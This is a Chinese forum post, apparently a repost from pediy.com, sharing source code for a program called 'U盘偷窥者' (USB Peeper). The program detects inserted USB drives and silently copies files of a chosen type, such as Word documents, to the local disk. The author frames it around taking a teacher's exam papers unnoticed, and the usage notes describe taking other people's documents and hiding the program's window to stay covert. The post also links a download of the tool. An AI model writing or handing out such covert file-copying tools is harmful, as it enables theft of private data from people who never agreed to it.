
# U 盘偷窥者源码

> 原文：[`www.pediy.com/kssd/pediy12/127663.html`](https://www.pediy.com/kssd/pediy12/127663.html)

今天发一篇文章吧，关于搜索文件的，我的软件名字叫做“U 盘偷窥者”。

灵感是来自我们的电磁学老师，我们快要考试了，老师每年都会把上届的试题给我们一份电子档的，当然每年的题也都差不多，老师可能也怕挂多了，自己面子上面过不去吧。然后上次同学拷贝试卷的时候，突然发现在试卷旁边的一个文件夹中还有些 `word` 文档，也准备拷回去，考试嘛，试卷当然不怕多咯！老师一看，连忙说：“这是我今年出的题目，你们拷回去了我怎么办！”当时我们都直乐。但我想如果要是有一个可以搜索 U 盘的文件的软件，然后拷贝到电脑上面，那该有多好啊，因为我们可以在上课之前打开电脑然后运行程序，老师 U 盘一插进去就可以自动的把 `word` 文档复制到电脑上面来了吗，最重要的是老师还不知道，那我们班的同学不都可以不挂科了吗？呵呵，想法是不是很好！（想是这么想，但是我还是不会这样做的，其一我不担心挂科，其二，考试本来就是公平竞争嘛，这样做了心里过不去），这时候我就在构思怎么去实现这个功能，软件很简单，3 个功能：

1. 查找是否有 U 盘存在
2. 搜索指定的文件夹的指定格式的文件（最重要的）
3. 拷贝到硬盘上面

`1` 和 `3` 都好实现，但是 `2` 就不怎么好实现了。我去网上查了一下，搜索文件的代码很多，要么是编译通不过，要么就是没有我需要的，最后还是觉定自己来动手实现吧。毕竟求人不如求己嘛！

现在我把核心代码发出来，源码在下面可以下载，仅供各位想学习的人参考，交流... 我也不是计算机专业的，代码粗糙，各位别见笑... 我尽量把代码注释的详细点，毕竟有很多初学者...

## 2. 查找文件

代码：

```
/\*我的实现和网上很多人实现方法不一样,这个是自己看别人代码然后悟出来的\*/
/\*我们要查找的是 path 路径下的,后缀名为 format 的文件\*/
void findfile(CString path,CString format)     
{  CFileFind ff;                                                               //这里用的是 CFileFind 这个类
  CString str;  //保存你查找的具体文件的后缀名
  BOOL work = ff.FindFile(path);                                                //查找指定路径下的文件
  while(work)
  {
    work = ff.FindNextFile();
    CString ss = ff.GetFileName();                //获得文件的名字
    int t =ss.Find('.');
    str = ss.Right(ss.GetLength()-ss.Find(".",0)-1); //取点后面的字符
    str.MakeLower();  //变成小写字母
    if(t !=-1)   //表示不是一个文件夹,而是一个文件 有"."存在
    {/\*我这里没考虑文件名为"."和".."的两个目录,因为我认为文件名中有"."表示它是个文件而不是目录,具体看代码\*/
      if(str==format)
      {
        
        CString paths = ff.GetFilePath();
        CString disk ="D:\\Copy 的 U 盘文件";
        ::CreateDirectory(disk,NULL);//创建一个目录放拷贝过来的文件
        disk+="\\\\";
        disk+=ff.GetFileName();
        ::CopyFile(paths,disk,true);//拷贝文件
      }

      
      
    }
    else  //如果是文件夹的话,就递归查找
    {
      CString path1 = ff.GetFilePath();//其实是获取当前目录下的所有文件
      path1+="\\*.*";
      findfile(path1,format);  //递归
       
    }
     
   
  }   
   
  ff.Close();

}
```

接下来我们用 `SetTimer` 来获取 U 盘信息

代码如下：

回调函数

代码：

```
void CALLBACK EXPORT TimerProc(
   HWND hWnd,      // handle of CWnd that called SetTimer
   UINT nMsg,      // WM_TIMER
   UINT nIDEvent , // timer identification
   DWORD dwTime    // system time
)
{
   
  char uType[] = "C:\\";
  for(;uType[0]<='Z';uType[0]++)                 //遍历磁盘找到可移动磁盘,获取可移动磁盘号
  {       
    if(DRIVE_REMOVABLE ==GetDriveType(uType))//符合这个条件的就是可移动磁盘,方法有很多了
    {  memset(uDisk,0,10);//重新置零,uDisk[]用于保存 U 盘盘符
      uDisk[0]=uType[0];
      strcat(uDisk,":\\*.*");
       
    }
  }   

  if(doc)            //doc 是 BOOL 型的,由外面传进去的 具体看源码
    findfile(uDisk,"doc");    //搜索指定文件和拷贝文件
   
}
```

这样就算完成了，看起来很简单吧，真正的去实现可花了我不少时间哦，这个还有很多功能自己可以去加的。我这里算是只给了一个思路，因为最近还要忙着复习... 只能写这么多了，当然获取 U 盘信息也可以用消息来实现，我就不做了，自己去网上查一下吧...

## 使用说明

本程序用于复制 U 盘的一些文档，程序会在 `C:\\CopyFormUDisk\\` 下生成你拷贝的文件。如果需要获取别人 u 盘上面的一些 `Word` `excle` 等文档。

本程序使用简单，只需要打开程序，设置你需要获取的文件格式，然后插上 U 盘几秒钟即可，当然如果你不希望别人知道你获取了他的文件，你可以把程序设置成隐藏，这样更隐蔽。

本程序 `F2` 是隐藏，`F3` 是显示程序，`F4` 是关闭程序

刘强  
长江大学  
2011.1.6

有些朋友是临时会员的可以到我的 V 盘上面下载软件：`http://www.vdisk.cn/liuqiangni`

上传的附件 `U 盘偷窥者主程序.rar`
